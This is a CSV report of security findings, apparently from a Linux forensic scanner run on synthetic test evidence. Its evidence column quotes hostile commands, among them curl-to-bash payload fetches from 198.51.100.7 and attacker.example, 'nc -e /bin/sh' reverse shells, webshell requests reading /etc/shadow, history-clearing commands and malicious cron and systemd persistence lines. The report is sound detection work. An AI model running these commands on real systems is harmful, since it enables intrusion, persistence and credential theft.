severity,category,title,description,artifact,timestamp,evidence,metadata
CRITICAL,credential_access,Account with empty password: bob,Account 'bob' has an empty password hash and an interactive shell - login is possible without credentials.,/home/claude/test_evidence/etc/shadow,2026-04-27T10:54:37+00:00,bob::19500:0:99999:7:::,user=bob
CRITICAL,credential_access,Direct root SSH login from 198.51.100.99,Successful interactive root SSH login from 198.51.100.99 via publickey. Direct root logins should be disabled (PermitRootLogin no).,/home/claude/test_evidence/var/log/auth.log,2026-09-12T05:01:00+00:00,Sep 12 05:01:00 web01 sshd[22000]: Accepted publickey for root from 198.51.100.99 port 51000 ssh2: RSA SHA256:XXXXXX,user=root; ip=198.51.100.99; method=publickey
CRITICAL,privilege_escalation,Non-root account with UID 0: toor,Account 'toor' has UID 0 - it has full root privileges. Legitimate systems have exactly one UID 0 account named 'root'.,/home/claude/test_evidence/etc/passwd,2026-04-27T10:54:32+00:00,toor:x:0:0:root backup:/root:/bin/bash,user=toor; uid=0
HIGH,account_management,Service account 'backup' has interactive shell,The system account 'backup' is configured with an interactive shell (/bin/bash). System accounts should have /usr/sbin/nologin or /bin/false.,/home/claude/test_evidence/etc/passwd,2026-04-27T10:54:32+00:00,backup:x:34:34:backup:/var/backups:/bin/bash,user=backup; shell=/bin/bash
HIGH,account_management,Service account 'www-data' has interactive shell,The system account 'www-data' is configured with an interactive shell (/bin/bash). System accounts should have /usr/sbin/nologin or /bin/false.,/home/claude/test_evidence/etc/passwd,2026-04-27T10:54:32+00:00,www-data:x:33:33:www-data:/var/www:/bin/bash,user=www-data; shell=/bin/bash
HIGH,anomaly,Kernel anomaly: ANOM_PROMISCUOUS,"auditd recorded a kernel anomaly event (ANOM_PROMISCUOUS). These typically indicate crashes, abends, or promiscuous-mode interface changes.",/home/claude/test_evidence/var/log/audit/audit.log,2024-09-12T03:55:00+00:00,type=ANOM_PROMISCUOUS msg=audit(1726113300.000:400): dev=eth0 prom=256 old_prom=0 auid=0 uid=0 gid=0 ses=4,
HIGH,credential_access,SSH brute-force pattern from 192.0.2.55,26 failed SSH authentications observed from 192.0.2.55 targeting 21 username(s).,auth.log/secure,,"users: admin, backup, demo, deploy, developer, docker, ftp, git, guest, info","ip=192.0.2.55; count=26; users=['admin', 'backup', 'demo', 'deploy', 'developer', 'docker', 'ftp', 'git', 'guest', 'info', 'mail', 'mysql', 'nginx', 'oracle', 'pi', 'postgres', 'root', 'test', 'testing', 'user', 'www']"
HIGH,credential_access,Successful SSH login after 26 failures from 192.0.2.55,User alice authenticated successfully from 192.0.2.55 after 26 failed attempts in the prior 10 minutes.,auth.log/secure,2026-09-12T04:23:30+00:00,,ip=192.0.2.55; user=alice
HIGH,defense_evasion,SELinux denial: sshd,SELinux blocked process sshd (scontext=system_u:system_r:sshd_t:s0-s0:c0.c1023) accessing target context unconfined_u:object_r:user_home_t:s0.,/home/claude/test_evidence/var/log/audit/audit.log,2024-09-12T03:53:20.111000+00:00,"type=AVC msg=audit(1726113200.111:300): avc:  denied  { execute } for  pid=2222 comm=""sshd"" name=""badbin"" dev=""dm-0"" ino=12345 scontext=system_u:system_r:sshd_t:s0-s0:c0.c1023 tcontext=unconfined_u:object_r:user_home_t:s0 tclass=file",
HIGH,defense_evasion,Security package removed: auditd,A security / monitoring package (auditd) was uninstalled. Confirm whether this matches an authorised change.,/home/claude/test_evidence/var/log/dpkg.log,2025-09-12T04:30:21+00:00,,package=auditd; action=remove
HIGH,defense_evasion,Security package removed: auditd,A security / monitoring package (auditd) was uninstalled. Confirm whether this matches an authorised change.,/home/claude/test_evidence/var/log/apt/history.log,2025-09-12T04:30:20+00:00,,package=auditd; action=remove
HIGH,defense_evasion,Security package removed: fail2ban,A security / monitoring package (fail2ban) was uninstalled. Confirm whether this matches an authorised change.,/home/claude/test_evidence/var/log/dpkg.log,2025-09-12T04:30:30+00:00,,package=fail2ban; action=remove
HIGH,defense_evasion,Security package removed: fail2ban,A security / monitoring package (fail2ban) was uninstalled. Confirm whether this matches an authorised change.,/home/claude/test_evidence/var/log/apt/history.log,2025-09-12T04:30:20+00:00,,package=fail2ban; action=remove
HIGH,execution,Possible webshell access,HTTP request from 198.51.100.99 contains tokens commonly associated with webshell command execution: 'cmd='.,/home/claude/test_evidence/var/log/apache2/access.log,2025-09-12T04:30:11+00:00,"198.51.100.99 - - [12/Sep/2025:04:30:11 +0000] ""GET /uploads/wso.php?cmd=id HTTP/1.1"" 200 543 ""-"" ""Mozilla/5.0""",ip=198.51.100.99; request=GET /uploads/wso.php?cmd=id HTTP/1.1
HIGH,execution,Possible webshell access,HTTP request from 198.51.100.99 contains tokens commonly associated with webshell command execution: 'cmd='.,/home/claude/test_evidence/var/log/apache2/access.log,2025-09-12T04:30:15+00:00,"198.51.100.99 - - [12/Sep/2025:04:30:15 +0000] ""GET /uploads/wso.php?cmd=whoami HTTP/1.1"" 200 19 ""-"" ""Mozilla/5.0""",ip=198.51.100.99; request=GET /uploads/wso.php?cmd=whoami HTTP/1.1
HIGH,execution,Possible webshell access,HTTP request from 198.51.100.99 contains tokens commonly associated with webshell command execution: 'cmd='.,/home/claude/test_evidence/var/log/apache2/access.log,2025-09-12T04:30:30+00:00,"198.51.100.99 - - [12/Sep/2025:04:30:30 +0000] ""GET /uploads/wso.php?cmd=cat+/etc/shadow HTTP/1.1"" 200 1029 ""-"" ""Mozilla/5.0""",ip=198.51.100.99; request=GET /uploads/wso.php?cmd=cat+/etc/shadow HTTP/1.1
HIGH,execution,Suspicious EXECVE in auditd,"auditd recorded an EXECVE containing tokens associated with attacker tradecraft: curl , | bash.",/home/claude/test_evidence/var/log/audit/audit.log,2024-09-12T03:51:00.456000+00:00,/bin/bash -c curl -s http://198.51.100.7/x.sh | bash,
HIGH,execution,Suspicious EXECVE in auditd,auditd recorded an EXECVE containing tokens associated with attacker tradecraft: nc -e.,/home/claude/test_evidence/var/log/audit/audit.log,2024-09-12T03:52:00.789000+00:00,nc -e /bin/sh 198.51.100.7,
HIGH,hardening,PermitRootLogin = yes,sshd is configured to allow root login. Industry best practice is 'no'. 'without-password' permits root via key.,/home/claude/test_evidence/etc/ssh/sshd_config,2026-04-27T10:55:06+00:00,PermitRootLogin yes,
HIGH,hardening,Root password SSH login enabled,Both PermitRootLogin and PasswordAuthentication permit interactive root password authentication.,/home/claude/test_evidence/etc/ssh/sshd_config,2026-04-27T10:55:06+00:00,,
HIGH,hardware_anomaly,USB mass-storage attach,USB mass-storage device was attached. On servers this is anomalous and may indicate physical tampering or data exfiltration.,/home/claude/test_evidence/var/log/messages,2026-09-12T03:14:02+00:00,Sep 12 03:14:02 web01 kernel: usb-storage 1-1:1.0: USB Mass Storage device detected,
HIGH,hardware_anomaly,USB mass-storage attach,USB mass-storage device was attached. On servers this is anomalous and may indicate physical tampering or data exfiltration.,/home/claude/test_evidence/var/log/kern.log,2026-09-12T03:14:02+00:00,Sep 12 03:14:02 web01 kernel: [    1.345678] usb-storage 1-1:1.0: USB Mass Storage device detected,
HIGH,mac_denial,AppArmor denial in syslog,AppArmor denied an action - review the offending profile and the process being confined.,/home/claude/test_evidence/var/log/messages,2026-09-12T05:01:00+00:00,"Sep 12 05:01:00 web01 kernel: audit: type=1400 audit(1726113660.123:201): apparmor=""DENIED"" operation=""open"" profile=""/usr/sbin/nginx""",
HIGH,mac_denial,SELinux denial in syslog,SELinux denied an action. Investigate whether the denial reflects mis-configuration or actual attempted boundary violation.,/home/claude/test_evidence/var/log/kern.log,2026-09-12T04:00:00+00:00,"Sep 12 04:00:00 web01 kernel: [ 5000.000] audit: type=1400 audit(1726113600.000:300): avc:  denied  { execute } for  pid=999 comm=""bash""",
HIGH,persistence,Sudoers grants www-data permission to modify sudoers,www-data can modify the sudoers file itself - this is a complete privilege-escalation primitive.,/home/claude/test_evidence/etc/sudoers.d/90-custom,2026-04-27T10:55:18+00:00,www-data ALL=(ALL) NOPASSWD: /usr/bin/visudo,who=www-data; host=ALL; runas=ALL; tags=NOPASSWD:; commands=/usr/bin/visudo; file=/home/claude/test_evidence/etc/sudoers.d/90-custom
HIGH,persistence,Suspicious ExecStart in systemd unit sysmaint.service,A systemd unit's ExecStart line contains tokens associated with malicious automation: /tmp/..,/home/claude/test_evidence/etc/systemd/system/sysmaint.service,2026-04-27T10:55:48+00:00,/tmp/.cache/helper --daemon,name=sysmaint.service; path=/home/claude/test_evidence/etc/systemd/system/sysmaint.service; exec_start=['/tmp/.cache/helper --daemon']; exec_start_pre=[]; user=root; type=simple; wantedby=['multi-user.target']; description=System Maintenance Helper
HIGH,persistence,Suspicious cron command for user 'alice',A scheduled cron command contains tokens commonly seen in malicious automation: | bash.,/home/claude/test_evidence/var/spool/cron/crontabs/alice,2026-04-27T10:55:45+00:00,-qO- http://example.com/agent.sh | bash,schedule=@reboot; user=alice; command=-qO- http://example.com/agent.sh | bash; file=/home/claude/test_evidence/var/spool/cron/crontabs/alice
HIGH,persistence,Suspicious cron command for user 'root',"A scheduled cron command contains tokens commonly seen in malicious automation: curl , | bash.",/home/claude/test_evidence/etc/cron.d/sysmaint,2026-04-27T10:55:34+00:00,curl -s http://198.51.100.7/x.sh | bash,schedule=*/5 * * * *; user=root; command=curl -s http://198.51.100.7/x.sh | bash; file=/home/claude/test_evidence/etc/cron.d/sysmaint
HIGH,persistence,Suspicious cron command for user 'www-data',A scheduled cron command contains tokens commonly seen in malicious automation: /tmp/..,/home/claude/test_evidence/etc/cron.d/sysmaint,2026-04-27T10:55:34+00:00,/tmp/.cache/agent,schedule=@reboot; user=www-data; command=/tmp/.cache/agent; file=/home/claude/test_evidence/etc/cron.d/sysmaint
HIGH,persistence,Suspicious tokens in global shell rc file,"Shell startup file 'utils.sh' contains tokens associated with attacker tradecraft: curl , | bash.",/home/claude/test_evidence/etc/profile.d/utils.sh,2026-04-27T10:56:47+00:00,(curl -fsSL http://198.51.100.7/cb.sh | bash) >/dev/null 2>&1 &,"scope=global; tokens=['curl ', '| bash']"
HIGH,persistence,Suspicious tokens in global shell rc file,"Shell startup file 'utils.sh' contains tokens associated with attacker tradecraft: curl , | bash.",/home/claude/test_evidence/etc/profile.d/utils.sh,2026-04-27T10:56:47+00:00,(curl -fsSL http://198.51.100.7/cb.sh | bash) >/dev/null 2>&1 &,"scope=global; tokens=['curl ', '| bash']"
HIGH,persistence,systemd unit sysmaint.service runs binary from world-writable location,"ExecStart for unit 'sysmaint.service' references a path in /tmp, /var/tmp or /dev/shm. Legitimate services should live under /usr/bin, /usr/local/bin, /opt, etc.",/home/claude/test_evidence/etc/systemd/system/sysmaint.service,2026-04-27T10:55:48+00:00,/tmp/.cache/helper --daemon,name=sysmaint.service; path=/home/claude/test_evidence/etc/systemd/system/sysmaint.service; exec_start=['/tmp/.cache/helper --daemon']; exec_start_pre=[]; user=root; type=simple; wantedby=['multi-user.target']; description=System Maintenance Helper
HIGH,privilege_escalation,Members of privileged group 'sudo',Group 'sudo' has the following members: alice. Verify each is authorised.,/home/claude/test_evidence/etc/group,2026-04-27T10:54:41+00:00,sudo:x:27:alice,group=sudo; members=['alice']
HIGH,privilege_escalation,NOPASSWD: ALL granted to alice,alice can run any command as ALL without a password.,/home/claude/test_evidence/etc/sudoers.d/90-custom,2026-04-27T10:55:18+00:00,alice ALL=(ALL) NOPASSWD: ALL,who=alice; host=ALL; runas=ALL; tags=NOPASSWD:; commands=ALL; file=/home/claude/test_evidence/etc/sudoers.d/90-custom
HIGH,reconnaissance,Scanner user-agent observed: sqlmap,A request from 198.51.100.55 carried a User-Agent matching the offensive tool 'sqlmap'.,/home/claude/test_evidence/var/log/apache2/access.log,2025-09-12T04:00:01+00:00,"198.51.100.55 - - [12/Sep/2025:04:00:01 +0000] ""GET / HTTP/1.1"" 200 1543 ""-"" ""sqlmap/1.7.2#stable (https://sqlmap.org)""",ip=198.51.100.55; ua=sqlmap/1.7.2#stable (https://sqlmap.org)
HIGH,reconnaissance,Scanner user-agent observed: sqlmap,A request from 198.51.100.55 carried a User-Agent matching the offensive tool 'sqlmap'.,/home/claude/test_evidence/var/log/apache2/access.log,2025-09-12T04:00:02+00:00,"198.51.100.55 - - [12/Sep/2025:04:00:02 +0000] ""GET /index.php?id=1' HTTP/1.1"" 500 245 ""-"" ""sqlmap/1.7.2#stable""",ip=198.51.100.55; ua=sqlmap/1.7.2#stable
HIGH,reconnaissance,Scanner user-agent observed: sqlmap,A request from 198.51.100.55 carried a User-Agent matching the offensive tool 'sqlmap'.,/home/claude/test_evidence/var/log/apache2/access.log,2025-09-12T04:00:03+00:00,"198.51.100.55 - - [12/Sep/2025:04:00:03 +0000] ""GET /admin/../../etc/passwd HTTP/1.1"" 404 162 ""-"" ""sqlmap/1.7.2#stable""",ip=198.51.100.55; ua=sqlmap/1.7.2#stable
HIGH,resource_anomaly,OOM killer activity,"Kernel out-of-memory killer activity recorded. Common during memory-exhaustion DoS, runaway miners, or fork-bomb behaviour.",/home/claude/test_evidence/var/log/messages,2026-09-12T03:20:11+00:00,Sep 12 03:20:11 web01 kernel: Out of memory: Killed process 12345 (xmrig) total-vm:2097152kB,
HIGH,resource_anomaly,OOM killer activity,"Kernel out-of-memory killer activity recorded. Common during memory-exhaustion DoS, runaway miners, or fork-bomb behaviour.",/home/claude/test_evidence/var/log/messages,2026-09-12T03:20:12+00:00,Sep 12 03:20:12 web01 kernel: oom-killer: gfp_mask=0x100cca(GFP_HIGHUSER_MOVABLE),
HIGH,resource_anomaly,OOM killer activity,"Kernel out-of-memory killer activity recorded. Common during memory-exhaustion DoS, runaway miners, or fork-bomb behaviour.",/home/claude/test_evidence/var/log/kern.log,2026-09-12T03:20:11+00:00,Sep 12 03:20:11 web01 kernel: [ 4567.890] Out of memory: Killed process 12345 (xmrig),
HIGH,suspicious_command,Suspicious command in claude history,Command executed by 'claude' contains tokens associated with attacker tradecraft: wget ,/home/claude/test_evidence/root/.bash_history,2026-04-27T10:55:55+00:00,wget http://198.51.100.7/x -O agent,user=claude; tokens=['wget ']
HIGH,suspicious_command,Suspicious command in claude history,"Command executed by 'claude' contains tokens associated with attacker tradecraft: curl , | bash",/home/claude/test_evidence/root/.bash_history,2026-04-27T10:55:55+00:00,curl -s http://attacker.example/payload.sh | bash,"user=claude; tokens=['curl ', '| bash']"
HIGH,suspicious_command,Suspicious command in claude history,Command executed by 'claude' contains tokens associated with attacker tradecraft: nc -e,/home/claude/test_evidence/root/.bash_history,2026-04-27T10:55:55+00:00,nc -e /bin/sh 198.51.100.7 4444,user=claude; tokens=['nc -e']
HIGH,suspicious_command,Suspicious command in claude history,Command executed by 'claude' contains tokens associated with attacker tradecraft: unset histfile,/home/claude/test_evidence/root/.bash_history,2026-04-27T10:55:55+00:00,unset HISTFILE,user=claude; tokens=['unset histfile']
HIGH,suspicious_command,Suspicious command in claude history,Command executed by 'claude' contains tokens associated with attacker tradecraft: history -c,/home/claude/test_evidence/root/.bash_history,2026-04-27T10:55:55+00:00,history -c,user=claude; tokens=['history -c']
HIGH,suspicious_command,Suspicious tokens in cron (CROND),"Log line contains tokens commonly seen in attacker tradecraft: curl , | bash.",/home/claude/test_evidence/var/log/cron,2026-09-12T04:30:01+00:00,Sep 12 04:30:01 web01 CROND[2000]: (root) CMD (curl -s http://198.51.100.7/x.sh | bash),"program=CROND; tokens=['curl ', '| bash']"
HIGH,suspicious_command,Suspicious tokens in kern.log (kernel),Log line contains tokens commonly seen in attacker tradecraft: xmrig.,/home/claude/test_evidence/var/log/kern.log,2026-09-12T03:20:11+00:00,Sep 12 03:20:11 web01 kernel: [ 4567.890] Out of memory: Killed process 12345 (xmrig),program=kernel; tokens=['xmrig']
HIGH,suspicious_command,Suspicious tokens in messages (cron),"Log line contains tokens commonly seen in attacker tradecraft: curl , | bash.",/home/claude/test_evidence/var/log/messages,2026-09-12T05:30:00+00:00,Sep 12 05:30:00 web01 cron[2222]: (root) CMD (curl -fsSL http://198.51.100.7/c.sh | bash),"program=cron; tokens=['curl ', '| bash']"
HIGH,suspicious_command,Suspicious tokens in messages (kernel),Log line contains tokens commonly seen in attacker tradecraft: xmrig.,/home/claude/test_evidence/var/log/messages,2026-09-12T03:20:11+00:00,Sep 12 03:20:11 web01 kernel: Out of memory: Killed process 12345 (xmrig) total-vm:2097152kB,program=kernel; tokens=['xmrig']
HIGH,suspicious_command,Suspicious tokens in syslog (CRON),Log line contains tokens commonly seen in attacker tradecraft: /tmp/..,/home/claude/test_evidence/var/log/syslog,2026-09-12T06:25:01+00:00,Sep 12 06:25:01 web01 CRON[5000]: (root) CMD (/tmp/.x/agent.sh),program=CRON; tokens=['/tmp/.']
MEDIUM,account_anomaly,Service account interactive login: backup,Service / system account 'backup' (uid=34) has a recorded interactive login in lastlog. Service accounts should normally never authenticate interactively.,/home/claude/test_evidence/var/log/lastlog,2024-09-12T00:13:20+00:00,uid=34 user=backup line=pts/2 host=198.51.100.7 time=2024-09-12T00:13:20+00:00,uid=34; line=pts/2; host=198.51.100.7
MEDIUM,account_anomaly,Service account interactive login: www-data,Service / system account 'www-data' (uid=33) has a recorded interactive login in lastlog. Service accounts should normally never authenticate interactively.,/home/claude/test_evidence/var/log/lastlog,2024-09-12T03:58:20+00:00,uid=33 user=www-data line=pts/3 host=198.51.100.99 time=2024-09-12T03:58:20+00:00,uid=33; line=pts/3; host=198.51.100.99
MEDIUM,account_management,New user account created: svc_backup,A new local user account was created. Confirm whether this matches a known change ticket or onboarding workflow.,/home/claude/test_evidence/var/log/auth.log,2026-09-12T04:25:01+00:00,"Sep 12 04:25:01 web01 useradd[21001]: new user: name=svc_backup, UID=998, GID=998, home=/home/svc_backup, shell=/bin/bash",
MEDIUM,defense_evasion,/etc/hosts redirects well-known domains,"Entries in /etc/hosts redirect well-known service domains (Google, GitHub, banking, update services) to non-loopback IPs. This can be used for credential theft or update-poisoning.",/home/claude/test_evidence/etc/hosts,2026-04-27T10:54:25+00:00,185.199.108.133 github.com,
MEDIUM,defense_evasion,Anti-forensic shell command,User 'claude' executed an anti-forensic command intended to clear or disable shell history.,/home/claude/test_evidence/root/.bash_history,2026-04-27T10:55:55+00:00,unset HISTFILE,user=claude
MEDIUM,defense_evasion,Anti-forensic shell command,User 'claude' executed an anti-forensic command intended to clear or disable shell history.,/home/claude/test_evidence/root/.bash_history,2026-04-27T10:55:55+00:00,history -c,user=claude
MEDIUM,exploitation,Path traversal attempt,Request from 198.51.100.55 contains a path-traversal sequence (../).,/home/claude/test_evidence/var/log/apache2/access.log,2025-09-12T04:00:03+00:00,"198.51.100.55 - - [12/Sep/2025:04:00:03 +0000] ""GET /admin/../../etc/passwd HTTP/1.1"" 404 162 ""-"" ""sqlmap/1.7.2#stable""",ip=198.51.100.55; request=GET /admin/../../etc/passwd HTTP/1.1
MEDIUM,privilege_escalation,Members of privileged group 'adm',"Group 'adm' has the following members: syslog, alice. Verify each is authorised.",/home/claude/test_evidence/etc/group,2026-04-27T10:54:41+00:00,"adm:x:4:syslog,alice","group=adm; members=['syslog', 'alice']"
MEDIUM,privilege_escalation,Members of privileged group 'docker',Group 'docker' has the following members: bob. Verify each is authorised.,/home/claude/test_evidence/etc/group,2026-04-27T10:54:41+00:00,docker:x:998:bob,group=docker; members=['bob']
MEDIUM,stability_anomaly,6 crash/segfault events for 'kernel',Process 'kernel' produced 6 crash-class log messages (segfault / general protection / panic). Repeated crashes can indicate exploit attempts or memory-corruption bugs being triggered.,/home/claude/test_evidence/var/log/messages,,,program=kernel; count=6
